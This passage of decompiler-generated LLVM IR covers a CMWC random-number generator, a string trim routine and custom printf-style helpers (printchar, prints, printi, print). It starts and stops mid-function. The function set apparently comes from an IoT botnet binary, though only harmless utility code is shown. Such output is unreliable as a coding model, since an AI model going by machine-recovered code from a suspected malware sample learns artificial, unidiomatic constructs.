  %v1_821c = add i32 %v0_81fc, -1640531527
  store i32 %v1_821c, i32* @global_var_272f4.22, align 4
  %v1_8238 = add i32 %v0_81fc, 1013904242
  store i32 %v1_8238, i32* @global_var_272f8.23, align 4
  br label %dec_label_pc_8250

dec_label_pc_8250:                                ; preds = %entry, %dec_label_pc_8250
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8294, %dec_label_pc_8250 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8260 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_272f0.21 to i32), i32 -12)
  %v6_8260 = inttoptr i32 %v5_8260 to i32*
  %v7_8260 = load i32, i32* %v6_8260, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8270 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_272f0.21 to i32), i32 -8)
  %v6_8270 = inttoptr i32 %v5_8270 to i32*
  %v7_8270 = load i32, i32* %v6_8270, align 4
  %v2_8274 = xor i32 %storemerge12, -1640531527
  %v2_827c = xor i32 %v2_8274, %v7_8260
  %v2_8284 = xor i32 %v2_827c, %v7_8270
  %v5_828c = mul nuw nsw i32 %storemerge12, 4
  %v6_828c = add i32 %v5_828c, ptrtoint (i32* @global_var_272f0.21 to i32)
  %v7_828c = inttoptr i32 %v6_828c to i32*
  store i32 %v2_8284, i32* %v7_828c, align 4
  %v1_8294 = add nuw nsw i32 %storemerge12, 1
  %v7_82ac = icmp slt i32 %v1_8294, 4096
  br i1 %v7_82ac, label %dec_label_pc_8250, label %dec_label_pc_82b0

dec_label_pc_82b0:                                ; preds = %dec_label_pc_8250
  %v1_82b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82b8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8250, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_82f4 = load i32, i32* @global_var_2704c.26, align 4
  %v1_82f8 = add i32 %v2_82f4, 1
  %v3_8300 = urem i32 %v1_82f8, 4096
  store i32 %v3_8300, i32* @global_var_2704c.26, align 4
  %v4_8318 = mul nuw nsw i32 %v3_8300, 4
  %v5_8318 = add i32 %v4_8318, ptrtoint (i32* @global_var_272f0.21 to i32)
  %v6_8318 = inttoptr i32 %v5_8318 to i32*
  %v7_8318 = load i32, i32* %v6_8318, align 4
  %v6_8338 = udiv i32 %v7_8318, 228675
  store i32 %v6_8338, i32* @global_var_27048.29, align 4
  br i1 true, label %dec_label_pc_83c8, label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %entry
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry, %dec_label_pc_83a8
  %v4_83e8 = mul nuw nsw i32 %v3_8300, 4
  %v5_83e8 = add i32 %v4_83e8, ptrtoint (i32* @global_var_272f0.21 to i32)
  %v6_83e8 = inttoptr i32 %v5_83e8 to i32*
  %v7_83e8 = load i32, i32* %v6_83e8, align 4
  ret i32 %v7_83e8

; uselistorder directives
  uselistorder i32 %v3_8300, { 0, 2, 1 }
  uselistorder i32* @global_var_272f0.21, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_272f0.21 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83c8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8428 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8448, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8440, %dec_label_pc_8448 ]
  %v2_8454 = add i32 %stack_var_-24.0, %tmp
  %v1_8458 = inttoptr i32 %v2_8454 to i8*
  %v2_8458 = load i8, i8* %v1_8458, align 1
  %v3_8458 = zext i8 %v2_8458 to i32
  store i32 %v3_8458, i32* %r0.global-to-local, align 4
  %v1_8460 = call i32 @isspace(i32 %v3_8458)
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8468 = icmp eq i32 %v1_8460, 0
  %v1_8440 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8468, label %dec_label_pc_8480.preheader, label %dec_label_pc_8448

dec_label_pc_8480.preheader:                      ; preds = %dec_label_pc_8448
  %v1_8430 = add i32 %v3_8428, -1
  %v5_848c10 = icmp slt i32 %v1_8430, %stack_var_-24.0
  br i1 %v5_848c10, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8474:                                ; preds = %dec_label_pc_8490
  %v1_8478 = add i32 %stack_var_-20.011, -1
  %v5_848c = icmp slt i32 %v1_8478, %stack_var_-24.0
  br i1 %v5_848c, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8480.preheader, %dec_label_pc_8474
  %stack_var_-20.011 = phi i32 [ %v1_8478, %dec_label_pc_8474 ], [ %v1_8430, %dec_label_pc_8480.preheader ]
  %v2_849c = add i32 %stack_var_-20.011, %tmp
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %v3_84a0 = zext i8 %v2_84a0 to i32
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v1_84a8 = call i32 @isspace(i32 %v3_84a0)
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84b0 = icmp eq i32 %v1_84a8, 0
  br i1 %v2_84b0, label %dec_label_pc_8500.preheader, label %dec_label_pc_8474

dec_label_pc_8500.preheader:                      ; preds = %dec_label_pc_8474, %dec_label_pc_8490, %dec_label_pc_8480.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8430, %dec_label_pc_8480.preheader ], [ %v1_8478, %dec_label_pc_8474 ], [ %stack_var_-20.011, %dec_label_pc_8490 ]
  br label %dec_label_pc_8500

dec_label_pc_84c4:                                ; preds = %dec_label_pc_8500
  %v2_84e8 = add i32 %storemerge1, %tmp
  %v1_84ec = inttoptr i32 %v2_84e8 to i8*
  %v2_84ec = load i8, i8* %v1_84ec, align 1
  %v3_84f0 = inttoptr i32 %v2_8524 to i8*
  store i8 %v2_84ec, i8* %v3_84f0, align 1
  %v1_84f8 = add i32 %storemerge1, 1
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500.preheader, %dec_label_pc_84c4
  %storemerge1 = phi i32 [ %v1_84f8, %dec_label_pc_84c4 ], [ %stack_var_-24.0, %dec_label_pc_8500.preheader ]
  %v7_850c = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8518 = sub i32 %storemerge1, %stack_var_-24.0
  %v2_8524 = add i32 %v2_8518, %tmp
  br i1 %v7_850c, label %dec_label_pc_8510, label %dec_label_pc_84c4

dec_label_pc_8510:                                ; preds = %dec_label_pc_8500
  %v3_852c = inttoptr i32 %v2_8524 to i8*
  store i8 0, i8* %v3_852c, align 1
  %v1_8538 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8538

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8430, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8500, { 1, 0 }
  uselistorder label %dec_label_pc_8500.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8490, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_854c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8558 = icmp eq i32 %v0_854c, 0
  br i1 %v2_8558, label %dec_label_pc_858c, label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %entry
  %v1_8564 = inttoptr i32 %v0_854c to i32*
  %v2_8564 = load i32, i32* %v1_8564, align 4
  %v1_8570 = trunc i32 %arg2 to i8
  %v3_8570 = inttoptr i32 %v2_8564 to i8*
  store i8 %v1_8570, i8* %v3_8570, align 1
  %v2_8578 = load i32, i32* %v1_8564, align 4
  %v1_857c = add i32 %v2_8578, 1
  store i32 %v1_857c, i32* %v1_8564, align 4
  %v1_85a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_858c:                                ; preds = %entry
  %v2_8548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_859c = call i32 @__GI_write(i32 1, i32 %v2_8548)
  store i32 %v2_859c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8560, %dec_label_pc_858c
  %v1_85a8 = phi i32 [ %v1_85a8.pre, %dec_label_pc_8560 ], [ %v2_859c, %dec_label_pc_858c ]
  ret i32 %v1_85a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_85b0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8668, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %entry
  %v2_861819 = load i8, i8* %arg2, align 1
  %v2_861c21 = icmp eq i8 %v2_861819, 0
  br i1 %v2_861c21, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_85fc
  %v4_861423 = phi i32 [ %v1_860c, %dec_label_pc_85fc ], [ %tmp, %dec_label_pc_85e8 ]
  %stack_var_-40.022 = phi i32 [ %v1_8600, %dec_label_pc_85fc ], [ 0, %dec_label_pc_85e8 ]
  %v1_8600 = add i32 %stack_var_-40.022, 1
  %v1_860c = add i32 %v4_861423, 1
  %v5_8610 = inttoptr i32 %v1_860c to i8*
  %v2_8618 = load i8, i8* %v5_8610, align 1
  %v2_861c = icmp eq i8 %v2_8618, 0
  br i1 %v2_861c, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_8624:                                ; preds = %dec_label_pc_85fc, %dec_label_pc_85e8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85e8 ], [ %v1_8600, %dec_label_pc_85fc ]
  %v5_8630 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8630, label %dec_label_pc_8640, label %dec_label_pc_8650

dec_label_pc_8640:                                ; preds = %dec_label_pc_8624
  %v2_8648 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8650

dec_label_pc_8650:                                ; preds = %dec_label_pc_8624, %dec_label_pc_8640
  %storemerge3 = phi i32 [ %v2_8648, %dec_label_pc_8640 ], [ 0, %dec_label_pc_8624 ]
  %v1_8654 = and i32 %arg4, 2
  %v2_8658 = icmp eq i32 %v1_8654, 0
  br i1 %v2_8658, label %dec_label_pc_8668, label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8650
  br label %dec_label_pc_8668

dec_label_pc_8668:                                ; preds = %dec_label_pc_8650, %entry, %dec_label_pc_8660
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8650 ], [ %storemerge3, %dec_label_pc_8660 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8650 ], [ 48, %dec_label_pc_8660 ]
  %v1_866c = urem i32 %arg4, 2
  %v2_8670 = icmp eq i32 %v1_866c, 0
  br i1 %v2_8670, label %dec_label_pc_86a0.preheader, label %dec_label_pc_86dc.preheader

dec_label_pc_86a0.preheader:                      ; preds = %dec_label_pc_8668
  %v5_86a816 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86a816, label %dec_label_pc_867c.lr.ph, label %dec_label_pc_86dc.preheader

dec_label_pc_867c.lr.ph:                          ; preds = %dec_label_pc_86a0.preheader
  %v2_8684 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.lr.ph, %dec_label_pc_867c
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_867c.lr.ph ], [ %v1_8698, %dec_label_pc_867c ]
  %v3_8684 = call i32 @printchar(i32* %v2_8684, i32 %stack_var_-44.0)
  %v3_8688 = load i32, i32* %stack_var_-48, align 4
  %v1_868c = add i32 %v3_8688, 1
  store i32 %v1_868c, i32* %stack_var_-48, align 4
  %v1_8698 = add nsw i32 %stack_var_-28.117, -1
  %v5_86a8 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_86a8, label %dec_label_pc_867c, label %dec_label_pc_86dc.preheader

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_867c, %dec_label_pc_86a0.preheader, %dec_label_pc_8668
  %v3_872027 = phi i32 [ 0, %dec_label_pc_8668 ], [ 0, %dec_label_pc_86a0.preheader ], [ %v1_868c, %dec_label_pc_867c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8668 ], [ %stack_var_-28.0, %dec_label_pc_86a0.preheader ], [ 0, %dec_label_pc_867c ]
  %v2_86e09 = load i8, i8* %arg2, align 1
  %v2_86e411 = icmp eq i8 %v2_86e09, 0
  br i1 %v2_86e411, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0.lr.ph

dec_label_pc_86b0.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b0

dec_label_pc_86b0:                                ; preds = %dec_label_pc_86b0.lr.ph, %dec_label_pc_86b0
  %v4_86dc13 = phi i32 [ %tmp, %dec_label_pc_86b0.lr.ph ], [ %v1_86d4, %dec_label_pc_86b0 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_86b0.lr.ph ], [ %v5_86d8, %dec_label_pc_86b0 ]
  %v2_86b4 = load i8, i8* %stack_var_-24.012, align 1
  %v3_86b4 = zext i8 %v2_86b4 to i32
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %v3_86b4)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add i32 %v4_86dc13, 1
  %v5_86d8 = inttoptr i32 %v1_86d4 to i8*
  %v2_86e0 = load i8, i8* %v5_86d8, align 1
  %v2_86e4 = icmp eq i8 %v2_86e0, 0
  br i1 %v2_86e4, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0

dec_label_pc_8714.preheader:                      ; preds = %dec_label_pc_86b0, %dec_label_pc_86dc.preheader
  %v3_872026 = phi i32 [ %v3_872027, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b0 ]
  %v5_871c6 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_871c6, label %dec_label_pc_86f0.lr.ph, label %dec_label_pc_8720

dec_label_pc_86f0.lr.ph:                          ; preds = %dec_label_pc_8714.preheader
  %v2_86f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86f0.lr.ph, %dec_label_pc_86f0
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86f0.lr.ph ], [ %v1_870c, %dec_label_pc_86f0 ]
  %v3_86f8 = call i32 @printchar(i32* %v2_86f8, i32 %stack_var_-44.0)
  %v3_86fc = load i32, i32* %stack_var_-48, align 4
  %v1_8700 = add i32 %v3_86fc, 1
  store i32 %v1_8700, i32* %stack_var_-48, align 4
  %v1_870c = add nsw i32 %stack_var_-28.37, -1
  %v5_871c = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_871c, label %dec_label_pc_86f0, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_8714.preheader
  %v3_8720 = phi i32 [ %v3_872026, %dec_label_pc_8714.preheader ], [ %v1_8700, %dec_label_pc_86f0 ]
  store i32 %v3_85b0, i32* @fp, align 4
  ret i32 %v3_8720

; uselistorder directives
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_860c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86f0, { 1, 0 }
  uselistorder label %dec_label_pc_86b0, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_8668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8650, { 1, 0 }
  uselistorder label %dec_label_pc_85fc, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8738 = load i32, i32* @fp, align 4
  store i32 34624, i32* %stack_var_-4, align 4
  %v2_873c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_873c, i32* @fp, align 4
  %v1_8770 = icmp slt i32 %arg2, 0
  %v2_8770 = icmp eq i32 %arg2, 0
  br i1 %v2_8770, label %dec_label_pc_8778, label %dec_label_pc_87ac

dec_label_pc_8778:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_879c = bitcast i32* %stack_var_-28 to i8*
  %v6_879c = call i32 @prints(i32 %arg1, i8* %v5_879c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_890c

dec_label_pc_87ac:                                ; preds = %entry
  %v2_87b0 = icmp eq i32 %arg4, 0
  br i1 %v2_87b0, label %dec_label_pc_87e4, label %dec_label_pc_87b8

dec_label_pc_87b8:                                ; preds = %dec_label_pc_87ac
  %v7_87bc = icmp eq i32 %arg3, 10
  br i1 %v7_87bc, label %dec_label_pc_87c4, label %dec_label_pc_87e4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87b8
  br i1 %v1_8770, label %dec_label_pc_87d0, label %dec_label_pc_87e4

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87c4
  %v1_87dc = sub i32 0, %arg2
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87b8, %dec_label_pc_87ac, %dec_label_pc_87d0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87ac ], [ %v1_87dc, %dec_label_pc_87d0 ], [ %arg2, %dec_label_pc_87c4 ], [ %arg2, %dec_label_pc_87b8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87ac ], [ 1, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_87c4 ], [ 0, %dec_label_pc_87b8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88784 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88784, label %dec_label_pc_8880, label %dec_label_pc_8800.lr.ph

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_87e4
  %v1_8828 = add i32 %arg7, -58
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8838
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8800.lr.ph ], [ %v2_880c, %dec_label_pc_8838 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8800.lr.ph ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_880c = udiv i32 %stack_var_-52.16, %arg3
  %v3_880c = urem i32 %stack_var_-52.16, %arg3
  %v7_8820 = icmp slt i32 %v3_880c, 10
  br i1 %v7_8820, label %dec_label_pc_8838, label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8800
  %v2_8830 = add i32 %v3_880c, %v1_8828
  br label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824
  %stack_var_-64.0 = phi i32 [ %v3_880c, %dec_label_pc_8800 ], [ %v2_8830, %dec_label_pc_8824 ]
  %v4_8838 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_883c = add i32 %v4_8838, -1
  %v5_8840 = inttoptr i32 %v1_883c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8858 = trunc i32 %fold to i8
  store i8 %v1_8858, i8* %v5_8840, align 1
  %v2_8878 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8878, label %dec_label_pc_8880, label %dec_label_pc_8800

dec_label_pc_8880:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e4
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87e4 ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_8884 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8884, label %dec_label_pc_88e8, label %dec_label_pc_888c

dec_label_pc_888c:                                ; preds = %dec_label_pc_8880
  %v3_888c = load i32, i32* %stack_var_0, align 4
  %v2_8890 = icmp eq i32 %v3_888c, 0
  br i1 %v2_8890, label %dec_label_pc_88d0, label %dec_label_pc_8898

dec_label_pc_8898:                                ; preds = %dec_label_pc_888c
  %v1_889c = and i32 %arg6, 2
  %v2_88a0 = icmp eq i32 %v1_889c, 0
  br i1 %v2_88a0, label %dec_label_pc_88d0, label %dec_label_pc_88a8

dec_label_pc_88a8:                                ; preds = %dec_label_pc_8898
  %v2_88b0 = inttoptr i32 %arg1 to i32*
  %v3_88b0 = call i32 @printchar(i32* %v2_88b0, i32 45)
  %v3_88c0 = load i32, i32* %stack_var_0, align 4
  %v1_88c4 = add i32 %v3_88c0, -1
  store i32 %v1_88c4, i32* %stack_var_0, align 4
  br label %dec_label_pc_88e8

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8898, %dec_label_pc_888c
  %v4_88d0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88d4 = add i32 %v4_88d0, -1
  %v5_88d8 = inttoptr i32 %v1_88d4 to i8*
  store i8 45, i8* %v5_88d8, align 1
  br label %dec_label_pc_88e8

dec_label_pc_88e8:                                ; preds = %dec_label_pc_8880, %dec_label_pc_88a8, %dec_label_pc_88d0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8880 ], [ %v5_88d8, %dec_label_pc_88d0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88a8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8880 ], [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88a8 ]
  %v3_88f0 = load i32, i32* %stack_var_0, align 4
  %v6_88f8 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_88f0, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8904 = add i32 %v6_88f8, %stack_var_-56.0
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_8778, %dec_label_pc_88e8
  %storemerge2 = phi i32 [ %v2_8904, %dec_label_pc_88e8 ], [ %v6_879c, %dec_label_pc_8778 ]
  store i32 %v3_8738, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8840, { 0, 2, 1 }
  uselistorder i32 %v3_880c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8838, { 1, 0 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35116, i32* %stack_var_-4, align 4
  %v2_8928 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8928, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cd429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cd831 = icmp eq i8 %v2_8cd429, 0
  br i1 %v2_8cd831, label %dec_label_pc_8ce0, label %dec_label_pc_8948.lr.ph

dec_label_pc_8948.lr.ph:                          ; preds = %entry
  %v5_8c8c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8948.lr.ph, %dec_label_pc_8cc4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8948.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8cc4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8948.lr.ph ], [ %v1_8cc8, %dec_label_pc_8cc4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8948.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8cc4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8948.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_894c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8950 = icmp eq i8 %v2_894c, 37
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8ca4

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v1_895c = add i32 %stack_var_-32.4.in34, 1
  %v5_8960 = inttoptr i32 %v1_895c to i8*
  %v2_8978 = load i8, i8* %v5_8960, align 1
  %v2_897c = icmp eq i8 %v2_8978, 0
  br i1 %v2_897c, label %dec_label_pc_8ce0, label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8958
  %v2_8988 = load i8, i8* %v5_8960, align 1
  %v7_898c = icmp eq i8 %v2_8988, 37
  br i1 %v7_898c, label %dec_label_pc_8ca4, label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8984
  %v2_8998 = load i8, i8* %v5_8960, align 1
  %v7_899c = icmp eq i8 %v2_8998, 45
  br i1 %v7_899c, label %dec_label_pc_89a4, label %dec_label_pc_89d4.preheader

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8994
  %v1_89a8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89ac = inttoptr i32 %v1_89a8 to i8*
  br label %dec_label_pc_89d4.preheader

dec_label_pc_89d4.preheader:                      ; preds = %dec_label_pc_89a4, %dec_label_pc_8994
  %stack_var_-32.0.ph = phi i8* [ %v5_8960, %dec_label_pc_8994 ], [ %v5_89ac, %dec_label_pc_89a4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8994 ], [ 1, %dec_label_pc_89a4 ]
  %v4_89d42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89d83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89dc7 = icmp eq i8 %v2_89d83, 48
  br i1 %v7_89dc7, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89d4.preheader, %dec_label_pc_89bc
  %v4_89d49 = phi i32 [ %v1_89c0, %dec_label_pc_89bc ], [ %v4_89d42, %dec_label_pc_89d4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89cc, %dec_label_pc_89bc ], [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ]
  %v1_89c0 = add i32 %v4_89d49, 1
  %v5_89c4 = inttoptr i32 %v1_89c0 to i8*
  %v1_89cc = or i32 %stack_var_-48.08, 2
  %v2_89d8 = load i8, i8* %v5_89c4, align 1
  %v7_89dc = icmp eq i8 %v2_89d8, 48
